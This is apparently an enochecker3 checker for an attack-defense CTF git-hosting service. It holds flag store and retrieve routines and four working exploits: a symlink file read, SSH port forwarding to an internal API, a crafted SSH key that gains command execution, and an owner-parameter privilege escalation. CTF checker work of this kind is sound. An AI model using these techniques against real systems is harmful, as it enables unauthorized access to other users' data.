from enochecker3 import (
    ChainDB,
    DependencyInjector,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_in
from typing import Optional, Callable

from httpx import AsyncClient, Response
from logging import LoggerAdapter
import asyncio

import paramiko

import io
import secrets
import random
import string
import tempfile
import re
from pathlib import Path
import json

import ssh_rsa
import gitwrapper as git

checker = Enochecker("gitter", 9200)
app = lambda: checker.app

FLAG_REPO = "flag"

noise_alph = string.ascii_letters + string.digits


def noise(nmin: int, nmax: int) -> str:
    n = random.randint(nmin, nmax)
    return "".join(secrets.choice(noise_alph) for _ in range(n))


def filenoise():
    if secrets.choice([True, False]):
        len = random.randint(0, 4096 * 4)
        return "".join(secrets.choice(string.printable) for i in range(len)).encode()
    else:
        len = random.randint(0, 4096 * 4)
        return random.randbytes(len)


def extract_id_from_response(text: str) -> int:
    # Find a line like 1:{"id":83}
    match = re.search(r'1:\s*\{"id":\s*(\d+)\}', text)
    if match:
        return int(match.group(1))
    raise ValueError("ID not found in response text")

def extract_uuid_from_response(text: str) -> str:
    # Find a line like 1:{"id":"ea6d3f81-6782-4679-8011-53742cd44831","username":"4f10f241a8993ab7"}
    match = re.search(r'1:\s*\{"id":"([0-9a-fA-F\-]+)"', text)
    if match:
        return match.group(1)
    raise MumbleException("UUID not found in response text")


def assert_status_code(logger: LoggerAdapter, r: Response, code: int = 200,
                       parse: Optional[Callable[str, str]] = None) -> None:
    if r.status_code == code:
        return
    errlog = r.text
    if parse is not None:
        errlog = parse(errlog)
    logger.error(f"Bad status code during {r.request.method} {r.request.url.path}: " \
                 + f"({r.status_code} != {code})\n{errlog}")
    raise MumbleException(f"{r.request.method} {r.request.url.path} failed")


async def find_action_id(logger: LoggerAdapter, client: AsyncClient, page: str, name: str):
    r = await client.get(page)
    assert_status_code(logger, r, code=200)

    scriptpaths = re.findall("<script src=\"([^\"]+)\"", r.text)
    scripts = await asyncio.gather(*(client.get(path) for path in scriptpaths))
    for script in scripts:
        regex = fr'\(0,.\.createServerReference\)\("([0-9a-f]+)",.\.callServer,void 0,.\.findSourceMapURL,"{name}"\)'
        found = re.search(regex, script.text)
        if found:
            return found.group(1)
    raise MumbleException("Failed to retrieve action id")


async def do_register(logger: LoggerAdapter, client: AsyncClient,
                      username: str, password: str, pubkey: str) -> None:

    logger.info(f"Registering user {username}:{password} with pubkey: {pubkey}")

    action_id = await find_action_id(logger, client, "/register", "register")

    r = await client.post("/register",
                          json=[username, password, pubkey.strip()],
                          headers={"Next-Action": action_id})
    assert_status_code(logger, r, code=200)

    if not r.text.startswith("0:") or "1:{\"error\"" in r.text:
        logger.info(f"Response: {r.text}")
        raise MumbleException("Failed to create account")

    return extract_uuid_from_response(r.text)


async def do_login(logger: LoggerAdapter, client: AsyncClient,
                   username: str, password: str) -> None:

    logger.info(f"Logging in with {username}:{password}")

    action_id = await find_action_id(logger, client, "/login", "login")

    r = await client.post("/login", json=[username, password], headers={
        "Next-Action": action_id
    })
    assert_status_code(logger, r, code=200)

    if not r.text.startswith("2:\"$Sreact.fragment\"") or "1:{\"error\"" in r.text:
        logger.info(f"Response: {r.text}")
        raise MumbleException("Failed to log in")


async def create_repo(logger: LoggerAdapter, client: AsyncClient, namespace: str,
                      repo: str, description_pub: str, description_priv: str) -> None:
    logger.info(f"Creating repository {namespace}/{repo}")

    action_id = await find_action_id(logger, client, f"/{namespace}/new", "createRepositoryForLoggedInUser")

    r = await client.post(f"/{namespace}/new", json=[{
        "name": repo,
        "public_description": description_pub,
        "private_description": description_priv,
    }], headers={
        "Next-Action": action_id
    })
    assert_status_code(logger, r, code=200)

    if r.text.startswith("0:") and "1:{\"error\":\"$undefined\"}" in r.text:
        return

    logger.info(f"Response: {r.text}")
    raise MumbleException("Failed to create repository")







async def read_file(logger: LoggerAdapter, client: AsyncClient, namespace: str,
                    repo: str, path: str) -> str:
    logger.info(f"Reading file {path} from {namespace}/{repo}")

    r = await client.get(f"/{namespace}/{repo}/tree/{path}", headers={"RSC": "1"})
    assert_status_code(logger, r, code=200)
    logger.info(r.text)

    return r.text


async def create_key(logger: LoggerAdapter, type: str = "ecdsa") -> (str, str):
    with tempfile.TemporaryDirectory() as tmpdirname:
        output = Path(tmpdirname) / 'key'
        proc = await asyncio.create_subprocess_exec('ssh-keygen', '-N', '', '-f', output, '-t', type)
        await proc.wait()

        with open(output, 'r') as f:
            privkey = f.read()
        with open(output.with_suffix('.pub'), 'r') as f:
            pubkey = f.read()
        return (privkey, pubkey)


def repo_url(task, username, repo):
    return f"git@{task.address}:{username}/{repo}"


@checker.putflag(0)
async def putflag_file(task: PutflagCheckerTaskMessage, logger: LoggerAdapter,
                       client: AsyncClient, db: ChainDB) -> str:
    username = secrets.token_hex(8)
    password = secrets.token_hex(16)

    privkey, pubkey = await create_key(logger)

    user_id = await do_register(logger, client, username, password, pubkey)
    await do_login(logger, client, username, password)

    await db.set("info", (username, password, privkey))

    await create_repo(logger, client, username, FLAG_REPO, '', '')

    with tempfile.TemporaryDirectory() as dir:
        async with git.clone(privkey, repo_url(task, username, FLAG_REPO), dir) as gitwrapper:
            await gitwrapper.write("flag.txt", task.flag)
            await gitwrapper.add("flag.txt")
            await gitwrapper.commit("Add flag.txt", "Checker McCheckerface", "flag@check.er")
            await gitwrapper.push()

    # Make sure file is accessible on filesystem for symlink exploit
    await read_file(logger, client, username, FLAG_REPO, "flag.txt")
    return f"{username}:{FLAG_REPO}/flag.txt"


@checker.getflag(0)
async def getflag_file(task: GetflagCheckerTaskMessage,
                       logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    try:
        (username, password, privkey) = await db.get("info")
    except KeyError:
        raise MumbleException("Database info missing")

    with tempfile.TemporaryDirectory() as dir:
        async with git.clone(privkey, repo_url(task, username, FLAG_REPO), dir) as gitwrapper:
            flag = await gitwrapper.read("flag.txt")
            assert_in(task.flag.encode(), flag, "Flag missing")


@checker.putflag(1)
async def putflag_description(task: PutflagCheckerTaskMessage, logger: LoggerAdapter,
                              client: AsyncClient, db: ChainDB) -> str:
    username = secrets.token_hex(8)
    password = secrets.token_hex(16)

    privkey, pubkey = await create_key(logger)

    user_id = await do_register(logger, client, username, password, pubkey)
    await do_login(logger, client, username, password)

    await db.set("info", (username, password, privkey))

    await create_repo(logger, client, username, FLAG_REPO, '', task.flag)
    return f"{username}:{FLAG_REPO}"


@checker.getflag(1)
async def getflag_description(task: GetflagCheckerTaskMessage,
                              logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    try:
        (username, password, privkey) = await db.get("info")
    except KeyError:
        raise MumbleException("Database info missing")

    await do_login(logger, client, username, password)

    r = await client.get(f"/{username}/{FLAG_REPO}", headers={"RSC": "1"})
    assert_status_code(logger, r, code=200)

    assert_in(task.flag, r.text, "Flag missing")


@checker.putnoise(0)
async def putnoise_file(task: PutnoiseCheckerTaskMessage,
                        logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    username = noise(10, 20)
    password = noise(10, 20)

    privkey, pubkey = await create_key(logger)

    await do_register(logger, client, username, password, pubkey)
    await do_login(logger, client, username, password)

    await db.set("login", (username, password, privkey))

    repo = noise(10, 20)
    pub_descr = noise(10, 20)
    priv_descr = noise(10, 20)
    await create_repo(logger, client, username, repo, pub_descr, priv_descr)

    await db.set("repo", (repo, pub_descr, priv_descr))

    with tempfile.TemporaryDirectory() as dir:
        async with git.clone(privkey, repo_url(task, username, repo), dir) as gitwrapper:
            num_files = random.randint(1, 10)
            files = []
            for i in range(num_files):
                filename = noise(10, 20)
                # Maybe try to create a directory
                directory = secrets.choice([True, False])
                if directory:
                    (Path(dir) / filename).mkdir()
                    subfiles = [noise(5, 20) for i in range(random.randint(1, 5))]
                    for f in subfiles:
                        path = f"{filename}/{f}"
                        content = filenoise()
                        await gitwrapper.write(path, content)
                        await gitwrapper.add(path)
                        files.append((path, content))
                else:
                    content = filenoise()
                    await gitwrapper.write(filename, content)
                    await gitwrapper.add(filename)
                    files.append((filename, content))
            commit_msg = noise(10, 20)
            author = noise(10, 20)
            if secrets.choice([True, False]):
                email = noise(10, 20)
            else:
                email = noise(3, 5) + "@" + noise(5, 20) + "." + noise(1, 3)
            await gitwrapper.commit(commit_msg, author, email)
            await gitwrapper.push()
            await db.set("commit", (commit_msg, author, email, files))


@checker.getnoise(0)
async def getnoise_file(task: GetnoiseCheckerTaskMessage,
                        logger: LoggerAdapter, client: AsyncClient,
                        db: ChainDB, di: DependencyInjector) -> None:
    try:
        (username, password, privkey) = await db.get("login")
        (repo, pubdescr, privdescr) = await db.get("repo")
        (commit_msg, author, email, files) = await db.get("commit")
    except KeyError:
        raise MumbleException("Database info missing")

    logger.info(f"get noise: {username} {password} {repo} {pubdescr} {privdescr} {commit_msg} {author} {email}")

    # Verify repository content
    with tempfile.TemporaryDirectory() as dir:
        async with git.clone(privkey, repo_url(task, username, repo), dir) as gitwrapper:
            for (path, content) in files:
                if await gitwrapper.read(path) != content:
                    logger.error(f"Failed file: {path}")
                    raise MumbleException("Failed to read file")
    # TODO: verify git history?


@checker.putnoise(1)
async def putnoise_description(task: PutnoiseCheckerTaskMessage,
                               logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    username = noise(10, 20)
    password = noise(10, 20)

    privkey, pubkey = await create_key(logger)

    await do_register(logger, client, username, password, pubkey)
    await do_login(logger, client, username, password)

    await db.set("login", (username, password, privkey))

    repo = noise(10, 20)
    pub_descr = noise(10, 20)
    priv_descr = noise(10, 20)
    await create_repo(logger, client, username, repo, pub_descr, priv_descr)

    await db.set("repo", (repo, pub_descr, priv_descr))


@checker.getnoise(1)
async def getnoise_description(task: GetnoiseCheckerTaskMessage,
                               logger: LoggerAdapter, client: AsyncClient,
                               db: ChainDB, di: DependencyInjector) -> None:
    try:
        (username, password, privkey) = await db.get("login")
        (repo, pubdescr, privdescr) = await db.get("repo")
    except KeyError:
        raise MumbleException("Database info missing")

    logger.info(f"get noise: {username} {password} {repo} {pubdescr} {privdescr}")

    # Verify public/private description
    await do_login(logger, client, username, password)

    r = await client.get(f"/{username}/{repo}", headers={"RSC": "1"})
    assert_status_code(logger, r, code=200)

    if pubdescr not in r.text:
        raise MumbleException("Public description missing")

    if privdescr not in r.text:
        raise MumbleException("Private description missing")


@checker.havoc(0)
async def havoc(task: HavocCheckerTaskMessage, logger: LoggerAdapter,
                client: AsyncClient, db: ChainDB, di: DependencyInjector) -> None:
    username = noise(10, 20)
    password = noise(10, 20)

    privkey, pubkey = await create_key(logger)

    await do_register(logger, client, username, password, pubkey)
    await do_login(logger, client, username, password)

    repo = noise(10, 20)
    pub_descr = noise(10, 20)
    priv_descr = noise(10, 20)
    await create_repo(logger, client, username, repo, pub_descr, priv_descr)

    client2 = AsyncClient(
        base_url=f"http://{task.address}:{checker.service_port}", verify=False
    )
    username2 = noise(10, 20)
    password2 = noise(10, 20)

    privkey, pubkey = await create_key(logger)

    await do_register(logger, client2, username2, password2, pubkey)
    await do_login(logger, client2, username2, password2)

    target_user_id = await get_user_id_by_username(logger, client, username, repo, username2)

    repo_error_screen = await client2.get(f"/{username}/{repo}")

    target_repo_id = getRepoIdFromErrorScreen(logger, repo_error_screen.text)
    logger.info(f"target repo: {target_repo_id}")

    await add_user_permission(logger, client, username, repo, target_repo_id, target_user_id, None)

    # create files
    with tempfile.TemporaryDirectory() as dir:
        async with git.clone(privkey, repo_url(task, username, repo), dir) as gitwrapper:
            filename = noise(10, 20)
            content = ''.join(secrets.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") for i in range(random.randint(0, 16)))
            await gitwrapper.write(filename, content)
            await gitwrapper.add(filename)
            commit_msg = noise(10, 20)
            author = noise(10, 20)
            if secrets.choice([True, False]):
                email = noise(10, 20)
            else:
                email = noise(3, 5) + "@" + noise(5, 20) + "." + noise(1, 3)
            await gitwrapper.commit(commit_msg, author, email)
            await gitwrapper.push()

    # verify file exists for other user
    r = await client2.get(f"/{username}/{repo}/tree/{filename}", headers={"RSC": "1"})
    assert_status_code(logger, r, code=200)

    assert_in(content, r.text)


@checker.exploit(0)
async def exploit_symlink(task: ExploitCheckerTaskMessage,
                          logger: LoggerAdapter, searcher: FlagSearcher,
                          client: AsyncClient) -> Optional[str]:
    if task.attack_info == "":
        raise MumbleException("Missing attack info")
    target = task.attack_info
    target_user = target.split(':')[0]

    username = secrets.token_hex(8)
    password = secrets.token_hex(16)

    logger.info(f"exploit symlink {username} {password}")

    privkey, pubkey = await create_key(logger)

    await do_register(logger, client, username, password, pubkey)
    await do_login(logger, client, username, password)

    await create_repo(logger, client, username, 'symlink', '', '')

    with tempfile.TemporaryDirectory() as dir:
        async with git.clone(privkey, repo_url(task, username, "symlink"), dir) as gitwrapper:
            (Path(dir) / "exploit").symlink_to(f"../../{target_user}/{FLAG_REPO}/flag.txt")
            await gitwrapper.add("exploit")
            await gitwrapper.commit("exploit symlink", "1337 H4x0r", "@hack.me")
            await gitwrapper.push()

    content = await read_file(logger, client, username, "symlink", "exploit")
    return searcher.search_flag(content)


import socketserver
import threading
import select
class ForwardServer(socketserver.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True


class Handler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            chan = self.ssh_transport.open_channel(
                "direct-tcpip",
                (self.chain_host, self.chain_port),
                self.request.getpeername(),
            )
        except Exception:
            return
        if chan is None:
            return

        while True:
            r, w, x = select.select([self.request, chan], [], [])
            if self.request in r:
                data = self.request.recv(1024)
                if len(data) == 0:
                    break
                chan.send(data)
            if chan in r:
                data = chan.recv(1024)
                if len(data) == 0:
                    break
                self.request.send(data)

        chan.close()
        self.request.close()


def forward_tunnel(local_port, remote_host, remote_port, transport):
    class SubHandler(Handler):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport

    forward_server = ForwardServer(('', local_port), SubHandler)
    thread = threading.Thread(target=forward_server.serve_forever, daemon=True)
    thread.start()
    return (forward_server, thread)


@checker.exploit(1)
async def exploit_port_forward(task: ExploitCheckerTaskMessage,
                               logger: LoggerAdapter, searcher: FlagSearcher,
                               client: AsyncClient) -> Optional[str]:
    if task.attack_info == "":
        raise MumbleException("Missing attack info")
    target = task.attack_info
    target_user = target.split(':')[0]

    privkey, pubkey = await create_key(logger, "rsa")
    username = secrets.token_hex(8)
    password = secrets.token_hex(8)

    await do_register(logger, client, username, password, pubkey)

    transport = paramiko.Transport((task.address, 9201))

    auth = paramiko.RSAKey.from_private_key(io.StringIO(privkey))
    transport.connect(hostkey=None,
                      username="git",
                      password=password,
                      pkey=auth)

    port = random.randint(3000, 9999)
    (server, thread) = forward_tunnel(port, "internal", 3000, transport)

    localclient = AsyncClient()
    r = await localclient.get(f"http://localhost:{port}/get-repositories?user={target_user}")
    data = r.text

    server.shutdown()
    thread.join()
    transport.close()

    return searcher.search_flag(data)


@checker.exploit(2)
async def exploit_pwn(task: ExploitCheckerTaskMessage,
                      logger: LoggerAdapter, searcher: FlagSearcher,
                      client: AsyncClient) -> Optional[str]:
    if task.attack_info == "":
        raise MumbleException("Missing attack info")
    target = task.attack_info
    target_user = target.split(':')[0]

    privkey, pubkey = ssh_rsa.build_exploit_ssh_key(target_user)
    username = secrets.token_hex(8)
    password = secrets.token_hex(8)

    await do_register(logger, client, username, password, pubkey)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    auth = paramiko.RSAKey.from_private_key(io.StringIO(privkey))
    client.connect(task.address, port=9201, username="git", pkey=auth)
    (stdin, stdout, stderr) = client.exec_command("bad_command")
    stdin.close()

    stdout_data = stdout.read()
    stderr_data = stderr.read()
    logger.info(f"Output: {stdout_data}|{stderr_data}")

    return searcher.search_flag(stdout_data + stderr_data)

if __name__ == "__main__":
    checker.run()


async def add_user_permission(logger: LoggerAdapter, client: AsyncClient, organization: str, repository: str,
                              repository_id: str, user_id: str, owner_id: str | None) -> None:
    logger.info(f"Adding user {user_id} to repository {repository} ({repository_id}) as owner {owner_id}")

    action_id = await find_action_id(logger, client, f"/{organization}/{repository}", "addContributor")

    params = [repository_id, user_id]
    if owner_id:
        params.append(owner_id)

    r = await client.post(f"/{organization}/{repository}", json=params, headers={
        "Next-Action": action_id
    })
    assert_status_code(logger, r, code=200)

    if r.text.startswith("0:") and "1:{\"error\":\"$undefined\"}" in r.text:
        return

    logger.info(f"Response: {r.text}")
    raise MumbleException("Failed to add user to repository")

async def get_user_id_by_username(logger: LoggerAdapter, client: AsyncClient,
                                  organization: str, repository: str, username: str) -> str:
    logger.info(f"Getting user id for {username}")

    action_id = await find_action_id(logger, client, f"/asdf/asdf", "searchUsersByPrefix")

    r = await client.post(f"/{organization}/{repository}", json=[username], headers={
        "Next-Action": action_id
    })
    assert_status_code(logger, r, code=200)

    if not r.text.startswith("0:") or "1:{\"error\"" in r.text:
        logger.info(f"Response: {r.text}")
        raise MumbleException("Failed to get user id")

    return getUserIdFromSearchResult(r.text, username)



def getUserIdFromSearchResult(text: str, username: str) -> str:
    import re
    try:
        # Find the first JSON array in the format 1:[{...}]
        match = re.search(r'\d+:\s*(\[[^\]]*\])', text)
        if not match:
            raise MumbleException("Failed to get user id from search result: JSON array not found")
        json_part = match.group(1)
        data = json.loads(json_part)
        for entry in data:
            if entry.get("username") == username:
                return entry.get("id")
    except Exception as e:
        print(f"text: {text}")
        print(f"Exception: {e}")
    raise MumbleException(f"Failed to get user id from search result: Not found")


# TODO not sure this is a nice way to do it, maybe we just want to give the repoid to them instead
def getRepoIdFromErrorScreen(logger: LoggerAdapter, text: str) -> str:
    import re
    match = re.search(r'repository\s*\(id:\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})\)', text, re.IGNORECASE)
    if match:
        logger.info(f"Repo ID found in error screen: {match.group(1)}")
        return match.group(1)
    raise MumbleException("Repo ID not found")



async def do_logout(logger: LoggerAdapter, client: AsyncClient) -> None:
    r = await client.post("http://localhost:9200/logout")
    assert_status_code(logger, r, code=200)


# TODO how do I specify that an exploit only works for one flagstore?? 
@checker.exploit(3)
async def exploit_extra_param(task: ExploitCheckerTaskMessage,
                          logger: LoggerAdapter, searcher: FlagSearcher,
                          client: AsyncClient) -> Optional[str]:
    if task.attack_info == "":
        raise MumbleException("Missing attack info")
    target = task.attack_info
    target_user = target.split(':')[0]
    target_repo = target.split(':')[1].split('/')[0] # remove last part once we can configure it to ignore other flagstore

    logger.info(f"Target: {target_user} {target_repo}")

    username = secrets.token_hex(8)
    password = secrets.token_hex(16)

    logger.info(f"exploit extra param {username} {password}")

    privkey, pubkey = await create_key(logger)

    user_id = await do_register(logger, client, username, password, pubkey)
    await do_login(logger, client, username, password)

    repo_error_screen = await client.get(f"/{target_user}/{target_repo}")

    logger.info(f"Repo error screen (/{target_user}/{target_repo}): {repo_error_screen.text}")
    target_repo_id = getRepoIdFromErrorScreen(logger, repo_error_screen.text)

    target_user_id = await get_user_id_by_username(logger, client, target_user, target_repo, target_user)

    await add_user_permission(logger, client, username, target_repo, target_repo_id, user_id, target_user_id)

    logger.info(f"Added user {user_id} to repository {target_repo_id} as owner {target_user_id}")



    content = await read_file(logger, client, target_user, FLAG_REPO, "flag.txt")

    logger.info(f"Found flag: {content}")

    logger.info(f"AAAAAAA")

    return searcher.search_flag(content)
